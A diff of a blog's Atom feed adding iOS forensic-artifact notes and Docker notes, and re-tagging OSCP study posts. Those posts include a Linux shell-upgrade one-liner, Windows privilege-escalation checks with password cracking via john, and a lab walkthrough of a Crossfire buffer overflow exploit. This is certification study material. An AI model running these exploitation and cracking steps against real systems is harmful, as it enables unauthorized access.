@@ -1,5 +1,156 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Daniel Haggerty's Blog</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-11-03T00:00:00-06:00</updated><entry><title>"iphone"</title><link href="/iphone.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/iphone.html</id><content type="html"></content><category term="DFIR"></category><category term="iphone"></category></entry><entry><title>"Docker Commands"</title><link href="/docker-commands.html" rel="alternate"></link><published>2020-01-18T00:00:00-06:00</published><updated>2020-01-18T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-01-18:/docker-commands.html</id><summary type="html">&lt;h3&gt;Docker&lt;/h3&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Digital Forensics</title><link href="/" rel="alternate"></link><link href="/feeds/all.atom.xml" rel="self"></link><id>/</id><updated>2020-11-03T00:00:00-06:00</updated><entry><title>Android Artifacts</title><link href="/android-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/android-artifacts.html</id><content type="html"></content><category term="Android"></category><category term="Android"></category><category term="Artifacts"></category></entry><entry><title>Calendar, Remiders, Time, Alarms</title><link href="/calendar-reminders-time-alarms.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/calendar-reminders-time-alarms.html</id><content type="html">&lt;h1&gt;Calendar&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;The calendar database is named  &lt;strong&gt;calendar.sqlitedb&lt;/strong&gt; and is stored at &lt;strong&gt;HomeDomain/Library/Calendar&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;The most important tables here are &lt;strong&gt;Calendar&lt;/strong&gt; and &lt;strong&gt;CalendarItem&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Calendar&lt;/strong&gt; stores calendars used by applications (iOS, Gmail, Facebook)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CalendarItem&lt;/strong&gt; stores information related to each entry saved&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Reminders&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Carving Binary plists</title><link href="/carving-binary-plists.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/carving-binary-plists.html</id><content type="html">&lt;h1&gt;&lt;/h1&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Cell Data Record Analysis</title><link href="/cdr.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/cdr.html</id><content type="html"></content><category term="CDR"></category><category term="CDR"></category></entry><entry><title>Elasticsearch O365 Audit Logs</title><link href="/elasticsearch-o365.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/elasticsearch-o365.html</id><content type="html"></content><category term="Mail"></category><category term="ELK"></category><category term="O365"></category></entry><entry><title>iPhone Backups</title><link href="/iphone-backups.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/iphone-backups.html</id><content type="html">&lt;h1&gt;iTunes&lt;/h1&gt;
+&lt;h2&gt;iTunes backup structure&lt;/h2&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>iPhone Messages, Calls and Contacts</title><link href="/iphone-messaging-and-calls.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/iphone-messaging-and-calls.html</id><summary type="html">&lt;h1&gt;iMessage and SMS/MMS Messages&lt;/h1&gt;
+&lt;h2&gt;Messages stored on device&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;All three message types (SMS, MMS, iMessage) stored in a SQLite3 database &lt;strong&gt;sms.db&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Located at &lt;strong&gt;/private/var/mobile/Library/SMS/&lt;/strong&gt; or &lt;strong&gt;HomeDomain-Library/SMS&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;mobile&lt;/strong&gt; is the root user on each iPhone&lt;/li&gt;
+&lt;li&gt;Media attachemnets stored in the &lt;strong&gt;MediaDomain-Library/SMS/Attachments&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Seven …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;iMessage and SMS/MMS Messages&lt;/h1&gt;
+&lt;h2&gt;Messages stored on device&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;All three message types (SMS, MMS, iMessage) stored in a SQLite3 database &lt;strong&gt;sms.db&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Located at &lt;strong&gt;/private/var/mobile/Library/SMS/&lt;/strong&gt; or &lt;strong&gt;HomeDomain-Library/SMS&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;mobile&lt;/strong&gt; is the root user on each iPhone&lt;/li&gt;
+&lt;li&gt;Media attachemnets stored in the &lt;strong&gt;MediaDomain-Library/SMS/Attachments&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Seven tables in &lt;strong&gt;sms.db&lt;/strong&gt; of which 3 are joins and 4 contain details (Message, Chat, Handle, Attachment)&lt;/li&gt;
+&lt;li&gt;Database stores times as Mac Epochs (1st, January, 2001 in seconds)&lt;/li&gt;
+&lt;li&gt;Date, Date read, Date Received&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Sending and receiving messages&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;iMessages can be transmitted over WiFi and/or cellular data&lt;/li&gt;
+&lt;li&gt;iMessages can only be sent to other iMessage users (sent message = blue)&lt;/li&gt;
+&lt;li&gt;If the message sent via SMS message the sent message will be green&lt;/li&gt;
+&lt;li&gt;Dates/times&lt;/li&gt;
+&lt;li&gt;Can determine those messages by those sent by Siri but &lt;em&gt;NOT&lt;/em&gt; those sent by talk-to-text&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;More info at &lt;a href="https://sqliteforensictoolkit.com/sms-recovered-records-and-contacts-3-ways/"&gt;Sanderson Forensics&lt;/a&gt;&lt;/p&gt;
+&lt;h1&gt;Call logs&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Pre iOS 8 call logs stored in a SQLite3 database &lt;strong&gt;call_history.db&lt;/strong&gt; in &lt;strong&gt;WirelessDomain&lt;/strong&gt; located at &lt;strong&gt;/private/var/wrieless&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Modern call logs database is &lt;strong&gt;CallHistroy.storedata&lt;/strong&gt; in &lt;strong&gt;HomeDomain&lt;/strong&gt; located at &lt;strong&gt;/Library/CallHistoryDB&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;zservice_provider tells you the application making the call&lt;ul&gt;
+&lt;li&gt;com.apple.Telephony is the standard iPhone call&lt;/li&gt;
+&lt;li&gt;com.apple.FaceTime&lt;/li&gt;
+&lt;li&gt;WhatsApp and Skype appear here if used&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;zcalltype (1 standard, 8 FaceTime video, 16 FaceTime aduio)&lt;/li&gt;
+&lt;li&gt;zdate is in Apple time&lt;/li&gt;
+&lt;li&gt;If you remove application the call logs tend to disappear&lt;/li&gt;
+&lt;li&gt;Application calls stored often exist only for a few days (e.g., Snapchat)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;Contacts&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Stored in &lt;strong&gt;AddressBook.sqlitedb&lt;/strong&gt; in &lt;strong&gt;WirelessDomain&lt;/strong&gt; located at &lt;strong&gt;/private/var/wrieless&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Two tables of note&lt;ol&gt;
+&lt;li&gt;ABPerson (Name, Organization, D.O.B)&lt;/li&gt;
+&lt;li&gt;ABMultiValue (phone numbers, email addresses, ringtone settings)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Mac Artifacts</title><link href="/mac-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/mac-artifacts.html</id><content type="html"></content><category term="Mac"></category><category term="Mac"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Safari</title><link href="/safari.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/safari.html</id><summary type="html">&lt;h1&gt;Safari Data&lt;/h1&gt;
+&lt;p&gt;Data storage for Safari has change dover the years and how data is stored will depend on version of iOS. There has been a gradual shift from &lt;strong&gt;plist&lt;/strong&gt; to &lt;strong&gt;sqlite&lt;/strong&gt; databases.&lt;/p&gt;
+&lt;p&gt;Safari's main history data is stored in a database named &lt;strong&gt;History.db&lt;/strong&gt; at AppDomain-com.apple.mobilesafari/Library …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Safari Data&lt;/h1&gt;
+&lt;p&gt;Data storage for Safari has change dover the years and how data is stored will depend on version of iOS. There has been a gradual shift from &lt;strong&gt;plist&lt;/strong&gt; to &lt;strong&gt;sqlite&lt;/strong&gt; databases.&lt;/p&gt;
+&lt;p&gt;Safari's main history data is stored in a database named &lt;strong&gt;History.db&lt;/strong&gt; at AppDomain-com.apple.mobilesafari/Library/Safari&lt;/p&gt;
+&lt;p&gt;Tables of interest are:
+- history_items (url, domain, visit count)
+- history_visits (visit time, page title)&lt;/p&gt;
+&lt;p&gt;Artifacts extracted from Safari database may result from WebKit data: e.g., from internet searches from within applications.&lt;/p&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>iPhone Third-party Apps</title><link href="/third-party-apps.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/third-party-apps.html</id><summary type="html">&lt;h1&gt;Where might we find third-party app data?&lt;/h1&gt;
+&lt;p&gt;Look in info.plist  &amp;gt; Installed Applications &amp;gt; BundleId e.g., &lt;strong&gt;com.kik.chat&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Data may be in either &lt;strong&gt;AppDomain&lt;/strong&gt; or &lt;strong&gt;AppDomainGroup&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;For example, &lt;strong&gt;AppDomain-com.kik.chat&lt;/strong&gt;
+- Each of these folders hould contain the subfolders of Library/Preferences and a &lt;strong&gt;plist&lt;/strong&gt; such as &lt;strong&gt;com.kik …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Where might we find third-party app data?&lt;/h1&gt;
+&lt;p&gt;Look in info.plist  &amp;gt; Installed Applications &amp;gt; BundleId e.g., &lt;strong&gt;com.kik.chat&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Data may be in either &lt;strong&gt;AppDomain&lt;/strong&gt; or &lt;strong&gt;AppDomainGroup&lt;/strong&gt;. &lt;/p&gt;
+&lt;p&gt;For example, &lt;strong&gt;AppDomain-com.kik.chat&lt;/strong&gt;
+- Each of these folders hould contain the subfolders of Library/Preferences and a &lt;strong&gt;plist&lt;/strong&gt; such as &lt;strong&gt;com.kik.chat.plist&lt;/strong&gt; or &lt;strong&gt;group.com.kik.chat.plist&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;This &lt;strong&gt;plist&lt;/strong&gt; may contain a ton of data. It is up to the third-party developer as to what information is stored in this &lt;strong&gt;plist&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Can use a third-party app to find Buble Ids such as &lt;a href="https://offcornerdev.com/bundleid.html"&gt;OffCornerDev&lt;/a&gt;&lt;/p&gt;</content><category term="iPhone"></category><category term="iPhone"></category><category term="iOS"></category><category term="Artifacts"></category></entry><entry><title>Windows Artifacts</title><link href="/windows-artifacts.html" rel="alternate"></link><published>2020-11-03T00:00:00-06:00</published><updated>2020-11-03T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-11-03:/windows-artifacts.html</id><content type="html"></content><category term="Windows"></category><category term="Windows"></category><category term="Artifacts"></category></entry><entry><title>Docker Certified Associate</title><link href="/docker-certified-associate.html" rel="alternate"></link><published>2020-01-18T00:00:00-06:00</published><updated>2020-01-18T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-01-18:/docker-certified-associate.html</id><summary type="html">&lt;h3&gt;Docker&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Is equivalent too&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker create dans-container
+docker start dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run busybox ping google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;dockerfile&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;alpine&lt;/span&gt;
+
+&lt;span class="n"&gt;WORKDIR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/app&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="n"&gt;package&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;RUN&lt;/span&gt; &lt;span class="n"&gt;npm&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;version: &amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;services:&lt;/span&gt;
+&lt;span class="c"&gt;  redis-server:&lt;/span&gt;
+&lt;span class="c"&gt;    image: &amp;#39;redis&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;  node-app:&lt;/span&gt;
+&lt;span class="c"&gt;    restart: always&lt;/span&gt;
+&lt;span class="c"&gt;    build: .&lt;/span&gt;
+&lt;span class="c"&gt;    ports:&lt;/span&gt;
+&lt;span class="c"&gt;      - &amp;quot;4001 …&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;Docker&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Is equivalent too&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker create dans-container
+docker start dans-container
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;If:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run busybox ping google.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;dockerfile&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;node&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;alpine&lt;/span&gt;
+
+&lt;span class="n"&gt;WORKDIR&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/app&amp;#39;&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="n"&gt;package&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;json&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;RUN&lt;/span&gt; &lt;span class="n"&gt;npm&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt;
+
+&lt;span class="k"&gt;COPY&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="n"&gt;CMD&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;npm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;start&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;version: &amp;#39;3&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;services:&lt;/span&gt;
+&lt;span class="c"&gt;  redis-server:&lt;/span&gt;
+&lt;span class="c"&gt;    image: &amp;#39;redis&amp;#39;&lt;/span&gt;
+&lt;span class="c"&gt;  node-app:&lt;/span&gt;
+&lt;span class="c"&gt;    restart: always&lt;/span&gt;
+&lt;span class="c"&gt;    build: .&lt;/span&gt;
+&lt;span class="c"&gt;    ports:&lt;/span&gt;
+&lt;span class="c"&gt;      - &amp;quot;4001:8081&amp;quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The commands are different if we have a docker-compose.yml.&lt;/p&gt;</content><category term="Certifications"></category><category term="Docker"></category></entry><entry><title>Docker Commands</title><link href="/docker-commands.html" rel="alternate"></link><published>2020-01-18T00:00:00-06:00</published><updated>2020-01-18T00:00:00-06:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2020-01-18:/docker-commands.html</id><summary type="html">&lt;h3&gt;Docker&lt;/h3&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;docker run dans-container
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
@@ -184,7 +335,7 @@ docker-compose down
 &lt;span class="c1"&gt;# View running containers. &lt;/span&gt;
 &lt;span class="c1"&gt;# Must be in same folder as docker-compose.yml&lt;/span&gt;
 docker-compose ps
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Docker"></category><category term="Docker"></category></entry><entry><title>"Linux Privilege Escalation"</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content><category term="Certifications"></category><category term="Docker"></category></entry><entry><title>Linux Privilege Escalation</title><link href="/linux-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/linux-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
 &lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
 &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
 &lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
@@ -328,7 +479,7 @@ cap_dac_read_search ←
 -rwxr-xr-x 1 root root 39752 Feb 22 2017 /usr/bin/tac
 man capabilities
 CAP_DAC_READ_SEARCH
-* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>"Windows Privilege Escalation"</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
+* Bypass file read permission checks and directory read and execute permission checks;&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Privilege Escalation</title><link href="/windows-privilege-escalation.html" rel="alternate"></link><published>2019-11-01T00:00:00-05:00</published><updated>2019-11-01T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-11-01:/windows-privilege-escalation.html</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;icacls scsiaccess.exe&lt;/span&gt;
 &lt;span class="err"&gt;...&lt;/span&gt;
 &lt;span class="c"&gt;Everyone: (I)(F)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -473,7 +624,7 @@ https://crackstation.net
 https://hashkiller.co.uk
 john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Privilege Escalation"></category></entry><entry><title>"Linux Buffer Overflow"</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
+https://pentestlab.blog/2017/04/24/windows-kernel-exploits/&lt;/p&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Linux Buffer Overflow</title><link href="/linux-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/linux-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Linux Buffer Overflow (Crossfire)&lt;/h1&gt;
 &lt;p&gt;Download a version of the vulnerable app Crossfire&lt;/p&gt;
 &lt;h3&gt;Setup safe environment: iptables only allow traffic from loopback interface=targetip&lt;/h3&gt;
 &lt;p&gt;iptables –A, -p, -d, -j # Append, protocol, destination, jump
@@ -485,22 +636,27 @@ iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j …&lt;/p&gt
 crossfire listens on port 13327
 iptables -A INPUT -p tcp --destination-port 13327 ! -d 127.0.0.1 -j DROP
 iptables -A INPUT -p tcp --destination-port 4444 ! -d 127.0.0.1 -j DROP&lt;/p&gt;
-&lt;h3&gt;1. Run debugger and crash the app&lt;/h3&gt;
-&lt;p&gt;Get POC code from exploit db
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Run debugger and crash the app
+Get POC code from exploit db
 edb --run /usr/games/crossfire/bin/crossfire. In EDBG: Hit RUN twice
-crash = “\x41” &lt;em&gt;4379
+crash = “\x41” *4379
 buffer = “\x11(setup sound “ + crash + “\x90\x00#”
-python fuzz.py
-2. Control EIP
+python fuzz.py&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Control EIP
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379
 Swap into the crash var: python linux_buffer_overflow.py 
 EIP has been overwritten with the hex characters… 46 36 70 46
 These are unique 4 bytes in the buffer. Now find where they are in the buffer.
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046
-[&lt;/em&gt;] Exact match at offset 4368
+[*] Exact match at offset 4368
 Replace “crash = "\x41" * 4368 + "B" * 4 + "C" * 7”: python EIP_BBBB.py&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Make space for the shellcode&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Make space for the shellcode&lt;br&gt;
 Check for helpful registers: Follow in dump.
 EAX points to buffer start “setup sound “ opstring (len 12). Want to avoid these bytes. 
 ESP points to end of buffer “C * 7” (spare bytes). 
@@ -508,7 +664,8 @@ Add 12 bytes to EAX to align EAX with the A’s =&amp;gt; JMP EAX we skip over �
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm &amp;gt; add eax,12   83C00C add eax,byte +0xc
 nasm &amp;gt; jmp eax      FFE0 jmp eax
-Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/li&gt;
+Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. Looks like I didn’t test again here? Just note nasm output and move on?&lt;/p&gt;
+&lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;Discover bad characters
 All bad chars (except x00) contained in deault named script. Can use this for future.
@@ -542,7 +699,7 @@ buffer = "\x11(setup sound " + crash + "\x90\x00#“
 TURN OFF EDBG FOR EXPLOIT TO WORK: RUN CROSSFIRE: RUN EXPLOIT /usr/games/crossfire/bin/crossfire
 python exploit.py
 id; whoami&lt;/li&gt;
-&lt;/ol&gt;</content><category term="OSCP"></category><category term="Penetration Testing"></category><category term="Buffer Overflow"></category></entry><entry><title>"Windows Buffer Overflow"</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
+&lt;/ol&gt;</content><category term="Certifications"></category><category term="OSCP"></category></entry><entry><title>Windows Buffer Overflow</title><link href="/windows-buffer-overflow.html" rel="alternate"></link><published>2019-10-31T00:00:00-05:00</published><updated>2019-10-31T00:00:00-05:00</updated><author><name>Daniel Haggerty</name></author><id>tag:None,2019-10-31:/windows-buffer-overflow.html</id><summary type="html">&lt;h1&gt;Windows Buffer Overflow (SLMail)&lt;/h1&gt;
